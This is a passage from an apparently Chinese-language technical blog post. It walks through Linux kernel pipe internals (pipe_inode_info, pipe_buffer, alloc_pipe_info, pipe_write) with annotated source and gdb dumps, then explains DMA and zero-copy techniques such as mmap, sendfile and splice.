&#123;        counter = 0x0      &#125;,      osq = &#123;        tail = &#123;          counter = 0x0        &#125;      &#125;,      wait_lock = &#123;        raw_lock = &#123;          &#123;            val = &#123;              counter = 0x0            &#125;,            &#123;              locked = 0x0,              pending = 0x0            &#125;,            &#123;              locked_pending = 0x0,              tail = 0x0            &#125;          &#125;        &#125;      &#125;,      wait_list = &#123;        next = 0xffff888005315170,        prev = 0xffff888005315170      &#125;    &#125;,    nrpages = 0x0,    nrexceptional = 0x0,    writeback_index = 0x0,    a_ops = 0xffffffff8201a340 &lt;empty_aops&gt;,    flags = 0x0,    wb_err = 0x0,    private_lock = &#123;      &#123;        rlock = &#123;          raw_lock = &#123;            &#123;              val = &#123;                counter = 0x0              &#125;,              &#123;                locked = 0x0,                pending = 0x0              &#125;,              &#123;                locked_pending = 0x0,                tail = 0x0              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;,    private_list = &#123;      next = 0xffff8880053151b0,      prev = 0xffff8880053151b0    &#125;,    private_data = 0x0 &lt;fixed_percpu_data&gt;  &#125;,  i_devices = &#123;    next = 0xffff8880053151c8,    prev = 0xffff8880053151c8  &#125;,  &#123;    i_pipe = 0xffff888004f72e40,    i_cdev = 0xffff888004f72e40,    i_link = 0xffff888004f72e40 &quot;&quot;,    i_dir_seq = 0x4f72e40  &#125;,  i_generation = 0x0,  i_fsnotify_mask = 0x0,  i_fsnotify_marks = 0x0 &lt;fixed_percpu_data&gt;,  i_private = 0x0 &lt;fixed_percpu_data&gt;&#125;*/\n\n\n\n6、struct pipe_inode_info这里为上面alloc_pipe_info所分配的数据结构，也就是管道的数据结构。里面的成员信息我用中文进行了注释。\n/** *\tstruct pipe_inode_info - a linux kernel pipe *\t@mutex: mutex protecting the whole thing *\t@rd_wait: reader wait point in case of empty pipe *\t@wr_wait: writer wait point in case of full pipe *\t@head: The point of buffer production *\t@tail: The point of buffer consumption *\t@note_loss: The next read() should insert a data-lost message *\t@max_usage: The maximum number of slots that may be used in the ring *\t@ring_size: total number of buffers (should be a power of 2) *\t@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs *\t@tmp_page: cached released page *\t@readers: number of current readers of this pipe *\t@writers: number of current writers of this pipe *\t@files: number of struct file referring this pipe (protected by -&gt;i_lock) *\t@r_counter: reader counter *\t@w_counter: writer counter *\t@fasync_readers: reader side fasync *\t@fasync_writers: writer side fasync *\t@bufs: the circular array of pipe buffers *\t@user: the user who created this pipe *\t@watch_queue: If this pipe is a watch_queue, this is the stuff for that **/struct pipe_inode_info &#123;\tstruct mutex mutex;\t\t\t\t\t\t// 互斥锁\twait_queue_head_t rd_wait, wr_wait;\t\t\t// 管道为空与管道已满时的指针\tunsigned int head;\t\t\t\t\t\t// 管道头\tunsigned int tail;\t\t\t\t\t\t\t// 管道尾\tunsigned int max_usage;\t\t\t\t// \tunsigned int ring_size;\t\t\t\t\t// 缓冲区大小（应该是2的幂）#ifdef CONFIG_WATCH_QUEUE\tbool note_loss;\t\t\t\t\t\t\t// 下一个 read() 应该插入一条数据丢失消息#endif\tunsigned int nr_accounted;\t\t\t// 该管道在 user-&gt;pipe_bufs 中所占的数量\tunsigned int readers;\t\t\t\t\t// 当前读管道的线程数量\tunsigned int writers;\t\t\t\t\t // 当前写管道的线程数量\tunsigned int files;\t\t\t\t\t\t  // 引用此管道的结构体数两（受 -&gt;i_lock 保护）\tunsigned int r_counter;\t\t\t\t\t// 读者计数器\tunsigned int w_counter;\t\t\t\t\t// 写者计数器\tstruct page *tmp_page;\t\t\t\t\t\t\t\t\t// 缓存页\tstruct fasync_struct *fasync_readers;\t\t\t\t// 读者端 fasync\tstruct fasync_struct *fasync_writers;\t\t\t\t// 写者端 fasync\tstruct pipe_buffer *bufs;\t\t\t\t\t\t\t\t // 管道缓冲区的循环数组\tstruct user_struct *user;\t\t\t\t\t\t\t\t\t// 创建此管道的用户#ifdef CONFIG_WATCH_QUEUE\tstruct watch_queue *watch_queue;\t\t\t\t// 如果这个管道是一个 watch_queue，则该结构体存储该结构#endif&#125;;\n\n\n\n7、struct pipe_bufferpipe中的数据保存在结构体 pipe_buffer中。同样，里面的成员信息我用中文进行了注释。\n/** *\tstruct pipe_buffer - a linux kernel pipe buffer *\t@page: the page containing the data for the pipe buffer *\t@offset: offset of data inside the @page *\t@len: length of data inside the @page *\t@ops: operations associated with this buffer. See @pipe_buf_operations. *\t@flags: pipe buffer flags. See above. *\t@private: private data owned by the ops. **/struct pipe_buffer &#123;\tstruct page *page;\t\t\t\t\t\t\t\t\t\t\t// \t包含管道缓冲区数据的页\t\t\t\t\t\tunsigned int offset, len;\t\t\t\t\t\t\t\t\t// 页内数据的长度\tconst struct pipe_buf_operations *ops;\t\t\t// 与该缓冲区关联的操作\tunsigned int flags;\t\t\t\t\t\t\t\t\t\t\t// 管道缓冲区flag\tunsigned long private;\t\t\t\t\t\t\t\t\t// 私有数据&#125;;\n\n\n\n8、alloc_pipe_info该函数被get_pipe_inode调用，用于生成一个pipe_inode_info对象。\n该函数的大体逻辑为：首先通过kzalloc为pipe_inode_info对象分配堆空间，之后对边界情况做了一些异常处理，之后通过 kcalloc 给pipe_inode_info-&gt;bufs分配堆内存，如果分配成功，则对pipe_inode_info的其他成员变量进行初始化。\nstruct pipe_inode_info *alloc_pipe_info(void)&#123;\tstruct pipe_inode_info *pipe;\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\t\t\t// 0x10\tstruct user_struct *user = get_current_user();\t\t// 这里的user相当于生成的管道的句柄（接口），包括被多少个进程，引用计数，用户有多少挂起的信号，拥有的watches数量等等。\tunsigned long user_bufs;\tunsigned int max_size = READ_ONCE(pipe_max_size);\t\t// 这里是 max_size为0x100000，pipe_max_size也为0x100000\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\t\t\t// 这里通过 kzalloc 为 pipe_inode_info 结构体对象生成一块堆空间\tif (pipe == NULL)\t\tgoto out_free_uid;\tif (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))\t\t\t// 没进入这个if，# define PAGE_SIZE 4096，而0x10 * 0x1000 &lt; 0x100000\t\tpipe_bufs = max_size &gt;&gt; PAGE_SHIFT;\t\t// # define PAGE_SHIFT 12\tuser_bufs = account_pipe_buffers(user, 0, pipe_bufs);\t// 0x10\tif (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;\t\t// 没进入该if\t\tuser_bufs = account_pipe_buffers(user, pipe_bufs, 1);\t\tpipe_bufs = 1;\t&#125;\tif (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())\t\t\t\t// 也没有进入该if\t\tgoto out_revert_acct;\tpipe-&gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\t\t\t     GFP_KERNEL_ACCOUNT);\t\t\t// 通过 kcalloc 给pipe_buffer分配堆内存。\tif (pipe-&gt;bufs) &#123;\t\t\t\t\t// 为pip_inode_info结构体其他变量赋值\t\tinit_waitqueue_head(&amp;pipe-&gt;rd_wait);\t\tinit_waitqueue_head(&amp;pipe-&gt;wr_wait);\t\tpipe-&gt;r_counter = pipe-&gt;w_counter = 1;\t\tpipe-&gt;max_usage = pipe_bufs;\t\t// 0x10\t\tpipe-&gt;ring_size = pipe_bufs;\t\t\t// 0x10\t\tpipe-&gt;nr_accounted = pipe_bufs;\t\t// 0x10\t\tpipe-&gt;user = user;\t\tmutex_init(&amp;pipe-&gt;mutex);\t\treturn pipe;\t&#125;out_revert_acct:\t(void) account_pipe_buffers(user, pipe_bufs, 0);\tkfree(pipe);out_free_uid:\tfree_uid(user);\treturn NULL;&#125;/*下面是该函数返回值，也就是pipegef➤  p *pipe$5 = &#123;  mutex = &#123;    owner = &#123;      counter = 0x0    &#125;,    wait_lock = &#123;      &#123;        rlock = &#123;          raw_lock = &#123;            &#123;              val = &#123;                counter = 0x0              &#125;,              &#123;                locked = 0x0,                pending = 0x0              &#125;,              &#123;                locked_pending = 0x0,                tail = 0x0              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;,    osq = &#123;      tail = &#123;        counter = 0x0      &#125;    &#125;,    wait_list = &#123;      next = 0xffff888004f72e50,      prev = 0xffff888004f72e50    &#125;  &#125;,  rd_wait = &#123;    lock = &#123;      &#123;        rlock = &#123;          raw_lock = &#123;            &#123;              val = &#123;                counter = 0x0              &#125;,              &#123;                locked = 0x0,                pending = 0x0              &#125;,              &#123;                locked_pending = 0x0,                tail = 0x0              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;,    head = &#123;      next = 0xffff888004f72e68,      prev = 0xffff888004f72e68    &#125;  &#125;,  wr_wait = &#123;    lock = &#123;      &#123;        rlock = &#123;          raw_lock = &#123;            &#123;              val = &#123;                counter = 0x0              &#125;,              &#123;                locked = 0x0,                pending = 0x0              &#125;,              &#123;                locked_pending = 0x0,                tail = 0x0              &#125;            &#125;          &#125;        &#125;      &#125;    &#125;,    head = &#123;      next = 0xffff888004f72e80,      prev = 0xffff888004f72e80    &#125;  &#125;,  head = 0x0,  tail = 0x0,  max_usage = 0x10,  ring_size = 0x10,  nr_accounted = 0x10,  readers = 0x0,  writers = 0x0,  files = 0x0,  r_counter = 0x1,  w_counter = 0x1,  tmp_page = 0x0 &lt;fixed_percpu_data&gt;,  fasync_readers = 0x0 &lt;fixed_percpu_data&gt;,  fasync_writers = 0x0 &lt;fixed_percpu_data&gt;,  bufs = 0xffff888004364800,  user = 0xffff888004396e80&#125;*/\n\n\n\n9、struct file_operations pipefifo_fops上面第5节，get_pipe_inode函数将inode-&gt;i_fop 赋值为&amp;pipefifo_fops；作用是确定pipe的操作函数。比如pipe_read为读管道的操作，而pipe_write为写管道的操作。\nconst struct file_operations pipefifo_fops = &#123;\t.open\t\t= fifo_open,\t.llseek\t\t= no_llseek,\t.read_iter\t= pipe_read,\t.write_iter\t= pipe_write,\t.poll\t\t= pipe_poll,\t.unlocked_ioctl\t= pipe_ioctl,\t.release\t= pipe_release,\t.fasync\t\t= pipe_fasync,&#125;;\n\n也可以通过调试的方式进行验证，我们在pipe_write函数下断点，运行在断点停止后查看函数调用栈。\ngef➤  bt#0  pipe_write (iocb=0xffffc9000036fe88, from=0xffffc9000036fe60) at fs/pipe.c:402#1  0xffffffff811edfe1 in call_write_iter (iter=0xffffc9000036fe60, kio=0xffffc9000036fe88, file=0xffff88800415aa00) at ./include/linux/fs.h:1901#2  new_sync_write (filp=filp@entry=0xffff88800415aa00, buf=buf@entry=0x559db68020e0 &quot;&quot;, len=len@entry=0x1000, ppos=ppos@entry=0x0 &lt;fixed_percpu_data&gt;) at fs/read_write.c:518#3  0xffffffff811f06e3 in vfs_write (file=file@entry=0xffff88800415aa00, buf=buf@entry=0x559db68020e0 &quot;&quot;, count=count@entry=0x1000, pos=pos@entry=0x0 &lt;fixed_percpu_data&gt;) at fs/read_write.c:605#4  0xffffffff811f0a92 in ksys_write (fd=&lt;optimized out&gt;, buf=0x559db68020e0 &quot;&quot;, count=0x1000) at fs/read_write.c:658#5  0xffffffff81b9f553 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc9000036ff58) at arch/x86/entry/common.c:46#6  0xffffffff81c0007c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:120#7  0x0000000000000000 in ?? ()\n\n我们知道kernel中对文件读写的函数为vfs_read和vfs_write。当满足一定条件时将会出现如下函数调用：vfs_write-&gt;new_sync_write-&gt;call_write_iter。观察call_write_iter函数实现。\nstatic inline ssize_t call_write_iter(struct file *file, struct kiocb *kio,\t\t\t\t      struct iov_iter *iter)&#123;\treturn file-&gt;f_op-&gt;write_iter(kio, iter);&#125;\n\n这里根据write_iter来确定函数调用，由于在上面的结构体中已经为其赋值，所以当对管道进行写操作时，将会调用pipe_write函数。\n10、pipe_write当写进程向管道中写入时，它利用标准的库函数write()，系统根据库函数传递的文件描述符，可找到该文件的 file 结构。file 结构中指定了用来进行写操作的函数（即写入函数）地址，于是，内核调用该函数完成写操作。写入函数在向内存中写入数据之前，必须首先检查 VFS 索引节点中的信息，同时满足如下条件时，才能进行实际的内存复制工作：\n内存中有足够的空间可容纳所有要写入的数据；内存没有被读程序锁定。\n\n如果同时满足上述条件，写入函数首先锁定内存，然后从写进程的地址空间中复制数据到内存。否则，写入进程就休眠在 VFS 索引节点的等待队列中，接下来，内核将调用调度程序，而调度程序会选择其他进程运行。写入进程实际处于可中断的等待状态，当内存中有足够的空间可以容纳写入数据，或内存被解锁时，读取进程会唤醒写入进程，这时，写入进程将接收到信号。当数据写入内存之后，内存被解锁，而所有休眠在索引节点的读取进程会被唤醒。\n管道的读取过程和写入过程类似。但是，进程可以在没有数据或内存被锁定时立即返回错误信息，而不是阻塞该进程，这依赖于文件或管道的打开模式。反之，进程可以休眠在索引节点的等待队列中等待写入进程写入数据。当所有的进程完成了管道操作之后，管道的索引节点被丢弃，而共享数据页也被释放\n推荐看下linux0.12内核对管道的实现，实现的思想是类似的，也便于对代码的理解。笔者在下面也贴出了0.12代码对pipe_write的实现。\npipe_write(struct kiocb *iocb, struct iov_iter *from)&#123;\tstruct file *filp = iocb-&gt;ki_filp;\tstruct pipe_inode_info *pipe = filp-&gt;private_data;\t\t\t// 调试打印该变量值，发现就是上面通过alloc_pipe_info函数生成的pipe\tunsigned int head;\tssize_t ret = 0;\tsize_t total_len = iov_iter_count(from);\tssize_t chars;\tbool was_empty = false;\tbool wake_next_writer = false;\t/* Null write succeeds. */\tif (unlikely(total_len == 0))\t\treturn 0;\t__pipe_lock(pipe);\t\t\t\t// 对pipe加互斥锁，保证单线程访问。\tif (!pipe-&gt;readers) &#123;\t\t\t// 这里要保证读取管道的任务不为0\t\tsend_sig(SIGPIPE, current, 0);\t\tret = -EPIPE;\t\tgoto out;\t&#125;#ifdef CONFIG_WATCH_QUEUE\tif (pipe-&gt;watch_queue) &#123;\t\tret = -EXDEV;\t\tgoto out;\t&#125;#endif\t/*\t * Only wake up if the pipe started out empty, since\t * otherwise there should be no readers waiting.\t *\t * If it wasn&#x27;t empty we try to merge new data into\t * the last buffer.\t *\t * That naturally merges small writes, but it also\t * page-aligs the rest of the writes for large writes\t * spanning multiple pages.\t */    /*    * 仅当管道开始为空时才唤醒，否则不应有读者在等待。    * 如果它不为空，我们会尝试将新数据合并到最后一个缓冲区中。    * 这自然会合并小型写入，但它也会为跨多个页面的大型写入对其余写入进行页面对齐。    */\thead = pipe-&gt;head;\t\t\t\t// 0x0\t\t\t\t\t\t\t\t\t\t\t\t\twas_empty = pipe_empty(head, pipe-&gt;tail);\t\t// 判断管道头尾指针是否相等，如果相等则管道为空。\tchars = total_len &amp; (PAGE_SIZE-1);\t\t\t\t\t\t// 0x38\tif (chars &amp;&amp; !was_empty) &#123;\t\tunsigned int mask = pipe-&gt;ring_size - 1;\t\t\t// 0xf\t\tstruct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];\t\t// pipe-&gt;bufs[0x10 &amp; 0xf]\t0x10 &amp; 0xf == 0\t\tint offset = buf-&gt;offset + buf-&gt;len;\t\t// 0x4\t\tif ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;\t\t    offset + chars &lt;= PAGE_SIZE) &#123;\t\t\tret = pipe_buf_confirm(pipe, buf);\t\t\tif (ret)\t\t\t\tgoto out;\t\t\tret = copy_page_from_iter(buf-&gt;page, offset, chars, from);\t\t\tif (unlikely(ret &lt; chars)) &#123;\t\t\t\tret = -EFAULT;\t\t\t\tgoto out;\t\t\t&#125;\t\t\tbuf-&gt;len += ret;\t\t\tif (!iov_iter_count(from))\t\t\t\tgoto out;\t\t&#125;\t&#125;\tfor (;;) &#123;\t\tif (!pipe-&gt;readers) &#123;\t\t\t\t\t\t// 如果pipe的读者数量为0，则发送信号，直到有读者。\t\t\tsend_sig(SIGPIPE, current, 0);\t\t\tif (!ret)\t\t\t\tret = -EPIPE;\t\t\tbreak;\t\t&#125;\t\thead = pipe-&gt;head;\t\tif (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;\t\t\t// 如果pipe没有被填满\t\t\tunsigned int mask = pipe-&gt;ring_size - 1;\t\t\t// 0xf\t\t\tstruct pipe_buffer *buf = &amp;pipe-&gt;bufs[head &amp; mask];\t\t// 所有成员均为0\t\t\tstruct page *page = pipe-&gt;tmp_page;\t\t// 0x0\t\t\tint copied;\t\t\t\t\t\tif (!page) &#123;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// 如果缓存页为空，这里的作用是为pipe-&gt;tmp_page赋值为新分配的page\t\t\t\tpage = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);\t\t//调用 alloc_page 分配页，alloc_page 最终调用了 __alloc_pages_nodemask 函数从空闲列表中取出，或通过slowpath进行分配\t\t\t\tif (unlikely(!page)) &#123;\t\t\t\t\tret = ret ? : -ENOMEM;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tpipe-&gt;tmp_page = page;\t\t\t\t\t\t&#125;\t\t\t/* Allocate a slot in the ring in advance and attach an\t\t\t * empty buffer.  If we fault or otherwise fail to use\t\t\t * it, either the reader will consume it or it&#x27;ll still\t\t\t * be there for the next write.\t\t\t */\t\t\tspin_lock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t\t\t\t\t\t\thead = pipe-&gt;head;\t\t\tif (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;\t\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t\tcontinue;\t\t\t&#125;\t\t\tpipe-&gt;head = head + 1;\t\t\tspin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);\t\t\t/* Insert it into the buffer array */\t\t\tbuf = &amp;pipe-&gt;bufs[head &amp; mask];\t\t\t// \t\t\tbuf-&gt;page = page;\t\t\tbuf-&gt;ops = &amp;anon_pipe_buf_ops;\t\t\tbuf-&gt;offset = 0;\t\t\tbuf-&gt;len = 0;\t\t\tif (is_packetized(filp))\t\t\t\t\t\t\t// 这里实际判断的是 file-&gt;f_flags &amp; O_DIRECT， 而  O_DIRECT 的含义是是否可以直接访问磁盘\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_PACKET;\t\t// #define PIPE_BUF_FLAG_PACKET\t0x08\t\t\telse\t\t\t\tbuf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;\t\t// #define PIPE_BUF_FLAG_CAN_MERGE\t0x10\t\t\tpipe-&gt;tmp_page = NULL;\t\t\tcopied = copy_page_from_iter(page, 0, PAGE_SIZE, from);\t\t// 调试发现某次执行的返回值为 0x1000\t\t\tif (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;\t\t\t\tif (!ret)\t\t\t\t\tret = -EFAULT;\t\t\t\tbreak;\t\t\t&#125;\t\t\tret += copied;\t\t\t\t// 0x0\t\t\tbuf-&gt;offset = 0;\t\t\tbuf-&gt;len = copied;\t\t\tif (!iov_iter_count(from))\t\t\t\tbreak;\t\t&#125;\t\tif (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))\t\t\tcontinue;\t\t/* Wait for buffer space to become available. */\t\tif (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;\t\t\tif (!ret)\t\t\t\tret = -EAGAIN;\t\t\tbreak;\t\t&#125;\t\tif (signal_pending(current)) &#123;\t\t\tif (!ret)\t\t\t\tret = -ERESTARTSYS;\t\t\tbreak;\t\t&#125;\t\t/*\t\t * We&#x27;re going to release the pipe lock and wait for more\t\t * space. We wake up any readers if necessary, and then\t\t * after waiting we need to re-check whether the pipe\t\t * become empty while we dropped the lock.\t\t */        /*        我们将释放管道锁并等待更多空间。 如有必要，我们会唤醒任何读者，然后在等待之后，我们需要重新检查在我们丢弃锁时管道是否为空。        */\t\t__pipe_unlock(pipe);\t\tif (was_empty) &#123;\t\t\twake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);\t\t\tkill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);\t\t&#125;\t\twait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));\t\t__pipe_lock(pipe);\t\twas_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);\t\twake_next_writer = true;\t&#125;out:\tif (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))\t\twake_next_writer = false;\t__pipe_unlock(pipe);\t/*\t * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we\t * want the reader to start processing things asap, rather than\t * leave the data pending.\t *\t * This is particularly important for small writes, because of\t * how (for example) the GNU make jobserver uses small writes to\t * wake up pending jobs\t */    /*        * 如果我们做一个唤醒事件，我们做一个“同步”唤醒，因为我们希望阅读器尽快开始处理事情，而不是让数据处于未决状态。        *        * 这对于小型写入尤其重要，因为（例如）GNU make jobserver 如何使用小型写入来唤醒挂起的作业    */\tif (was_empty) &#123;\t\twake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);\t\tkill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);\t&#125;\tif (wake_next_writer)\t\twake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);\tif (ret &gt; 0 &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;\t\tint err = file_update_time(filp);\t\tif (err)\t\t\tret = err;\t\tsb_end_write(file_inode(filp)-&gt;i_sb);\t&#125;\treturn ret;&#125;\n\n0.12内核代码\nint write_pipe(struct m_inode * inode, char * buf, int count)&#123;\tint chars, size, written = 0;\twhile (count&gt;0) &#123;\t\twhile (!(size=(PAGE_SIZE-1)-PIPE_SIZE(*inode))) &#123;\t\t\twake_up(&amp; PIPE_READ_WAIT(*inode));\t\t\tif (inode-&gt;i_count != 2) &#123; /* no readers */\t\t\t\tcurrent-&gt;signal |= (1&lt;&lt;(SIGPIPE-1));\t\t\t\treturn written?written:-1;\t\t\t&#125;\t\t\tsleep_on(&amp; PIPE_WRITE_WAIT(*inode));\t\t&#125;\t\tchars = PAGE_SIZE-PIPE_HEAD(*inode);\t\tif (chars &gt; count)\t\t\tchars = count;\t\tif (chars &gt; size)\t\t\tchars = size;\t\tcount -= chars;\t\twritten += chars;\t\tsize = PIPE_HEAD(*inode);\t\tPIPE_HEAD(*inode) += chars;\t\tPIPE_HEAD(*inode) &amp;= (PAGE_SIZE-1);\t\twhile (chars--&gt;0)\t\t\t((char *)inode-&gt;i_size)[size++]=get_fs_byte(buf++);\t&#125;\twake_up(&amp; PIPE_READ_WAIT(*inode));\treturn written;&#125;\n\n\n\n四、DMA copy一般DMA copy都会拿来与CPU copy做比较，所以我们将二者放在一起讨论。\n在没有 DMA 技术前，I/O 的过程是这样的：\n\nCPU 发出对应的指令给磁盘控制器，然后返回；\n磁盘控制器收到指令后，于是就开始准备数据，会把数据放入到磁盘控制器的内部缓冲区中，然后产生一个中断；\nCPU 收到中断信号后，停下手头的工作，接着把磁盘控制器的缓冲区的数据一次一个字节地读进自己的寄存器，然后再把寄存器里的数据写入到内存，而在数据传输的期间 CPU 是无法执行其他任务的。\n\n流程图如下\n![](I_O 中断-16486112380461.png)\n可以看到，整个数据的传输过程，都要需要 CPU 亲自参与搬运数据的过程，而且这个过程，CPU 是不能做其他事情的。当数据过多时将会对操作系统造成负担，也会降低系统的吞吐量。\n一个朴素的想法就是，当某个设备想要访问一块内存时就直接进行访问，不需要CPU进行参与，而DMA也是这么做的。\nDMA（Direct Memory Access）：顾名思义为直接内存访问，如果没有 DMA，当 CPU 使用编程输入/输出时通常会在整个读取或写入操作期间被完全占用，因此无法执行其他工作。对于 DMA，CPU 首先启动传输，然后在传输过程中执行其他操作，最后在操作完成时从 DMA 控制器 (DMAC)接收中断。许多硬件系统都使用 DMA，包括磁盘驱动器控制器、显卡、网卡和声卡等等。类似地，多核处理器内的处理元件可以在不占用其处理器时间的情况下将数据传入和传出其本地内存，从而允许计算和数据传输并行进行。\n流程如下\n![](DRM I_O 过程.png)\n虽然DMA很方便，但是DMA会带来缓存一致性的问题。什么是缓存一致性呢？当DMA与CPU均可以访问到缓存时，如果CPU对内存进行了修改，但是仅仅写在了缓存中还没同步进内存，此时硬件访问了内存，这时可能读到的是旧的值。这就是缓存一致性的问题。\n这些问题可以用两种方法来解决：\n\n缓存同调系统（Cache-coherent system）：以硬件方法来完成，当外部设备写入内存时以一个信号来通知缓存控制器某内存地址的值已经过期或是应该更新资料。\n非同调系统（Non-coherent system）：以软件方法来完成，操作系统必须确保在开始传出 DMA 传输之前刷新缓存行，并在访问受传入 DMA 传输影响的内存范围之前使其无效。\n\n第二种的方法会造成DMA的系统负担。\n但总体来说，DMA的出现，大大提高了系统的吞吐量。\n五、零拷贝这部分内容网上已经有很多不错的文章了，分析的也比较透彻，这里简单描述下相关的原理。\n1、传统的文件传输如果服务端要提供文件传输的功能，我们能想到的最简单的方式是：将磁盘上的文件读取出来，然后通过网络协议发送给客户端。\n传统 I/O 的工作方式是，数据读取和写入是从用户空间到内核空间来回复制，而内核空间的数据是通过操作系统层面的 I/O 接口从磁盘读取或写入。\n代码通常如下，一般会需要两个系统调用：\nread(file, tmp_buf, len);write(socket, tmp_buf, len);\n\n代码很简单，虽然就两行代码，但是这里面发生了不少的事情。\n\n首先发生了四次ring0和ring3的上下文切换（两次系统调用，每次系统调用都是先从ring3到ring0，ring0得到结果时再将结果返回给ring3）。而上下文切换到成本并不小，一次切换需要耗时几十纳秒到几微秒，虽然时间看上去很短，但是在高并发的场景下，这类时间容易被累积和放大，从而影响系统的性能。\n其次，还发生了 4 次数据拷贝，其中两次是 DMA 的拷贝，另外两次则是通过 CPU 拷贝的，下面说一下这个过程：\n\n第一次拷贝，把磁盘上的数据拷贝到操作系统内核的缓冲区里，这个拷贝的过程是通过 DMA 搬运的。\n第二次拷贝，把内核缓冲区的数据拷贝到用户的缓冲区里，于是我们应用程序就可以使用这部分数据了，这个拷贝到过程是由 CPU 完成的。\n第三次拷贝，把刚才拷贝到用户的缓冲区里的数据，再拷贝到内核的 socket 的缓冲区里，这个过程依然还是由 CPU 搬运的。\n第四次拷贝，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程又是由 DMA 搬运的。\n\n这种简单又传统的文件传输方式，存在冗余的上文切换和数据拷贝，在高并发系统里是非常糟糕的，多了很多不必要的开销，会严重影响系统性能。\n所以，要想提高文件传输的性能，就需要减少「用户态与内核态的上下文切换」和「内存拷贝」的次数。\n2、mmap + write在前面我们知道，read() 系统调用的过程中会把内核缓冲区的数据拷贝到用户的缓冲区里，于是为了减少这一步开销，我们可以用 mmap() 替换 read() 系统调用函数。                                               \nbuf = mmap(file, len);write(sockfd, buf, len);\n\nmmap() 系统调用函数会直接把内核缓冲区里的数据「映射」到用户空间，这样，操作系统内核与用户空间就不需要再进行任何的数据拷贝操作。\n![](mmap + write 零拷贝.png)\n具体过程如下：\n\n应用进程调用了 mmap() 后，DMA 会把磁盘的数据拷贝到内核的缓冲区里。接着，应用进程跟操作系统内核「共享」这个缓冲区；\n应用进程再调用 write()，操作系统直接将内核缓冲区的数据拷贝到 socket 缓冲区中，这一切都发生在内核态，由 CPU 来搬运数据；\n最后，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程是由 DMA 搬运的。\n\n我们可以得知，通过使用 mmap() 来代替 read()， 可以减少一次数据拷贝的过程。也就是说，使用mmap + write进行文件传输会进行四次上下文切换以及三次数据拷贝。\n但这还不是最理想的零拷贝，因为仍然需要通过 CPU 把内核缓冲区的数据拷贝到 socket 缓冲区里，而且仍然需要 4 次上下文切换，因为系统调用还是 2 次。\n3、sendfile在 Linux 内核版本 2.1 中，提供了一个专门发送文件的系统调用函数 sendfile()，函数形式如下：\n#include &lt;sys/socket.h&gt;ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);\n\n它的前两个参数分别是目的端和源端的文件描述符，后面两个参数是源端的偏移量和复制数据的长度，返回值是实际复制数据的长度。\n首先，它可以替代前面的 read() 和 write() 这两个系统调用，这样就可以减少一次系统调用，也就减少了 2 次上下文切换的开销。\n其次，该系统调用，可以直接把内核缓冲区里的数据拷贝到 socket 缓冲区里，不再拷贝到用户态，这样就只有 2 次上下文切换，和 3 次数据拷贝。如下图：\n\n在linux2.4版本，对于支持网卡支持 SG-DMA 技术的情况下， sendfile() 系统调用的过程发生了点变化，具体过程如下：\n\n第一步，通过 DMA 将磁盘上的数据拷贝到内核缓冲区里；\n第二步，缓冲区描述符和数据长度传到 socket 缓冲区，这样网卡的 SG-DMA 控制器就可以直接将内核缓存中的数据拷贝到网卡的缓冲区里，此过程不需要将数据从操作系统内核缓冲区拷贝到 socket 缓冲区中，这样就减少了一次数据拷贝；\n\n所以，这个过程之中，只进行了 2 次数据拷贝，如下图：\n\n在 2.6.33 之前的 Linux 内核中，out_fd必须引用一个套接字。从 Linux 2.6.33 开始，它可以是任何文件。如果是普通文件，然后sendfile () 适当地更改文件偏移量。\nsendfile有个问题是它的in_fd不能是套接字，只能是文件，所以应用场景上是有限制的。\n实现思路跟 splice是一样的，也需要使用pipe来做中介，但他这个do_splice_direct 使用一个每个进程缓存（在 corrent指针的 splice_pipe）的一个pipe，可以少用一次系统调用（正常的splice需要从 文件到 